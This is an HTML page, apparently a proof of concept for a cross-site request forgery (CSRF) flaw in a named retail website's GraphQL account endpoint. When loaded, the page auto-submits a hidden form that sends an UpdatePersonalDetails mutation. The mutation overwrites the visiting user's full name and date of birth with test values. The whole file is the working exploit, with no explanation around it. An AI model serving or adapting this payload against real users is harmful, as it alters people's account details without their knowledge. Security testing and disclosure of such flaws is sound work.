<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" enctype="text/plain">
      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
        updateAccountSettings(input: $input) {
          error
          fieldErrors {
            fieldName
            validators
            requiredButNotProvided
            invalidOption
          }
        }
      }'>
      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Tester"},{"fieldName":"dateOfBirth","value":"01-01-2001"}]}'>
      <input type="submit" value="Submit CSRF">
    </form>
  </body>
</html>
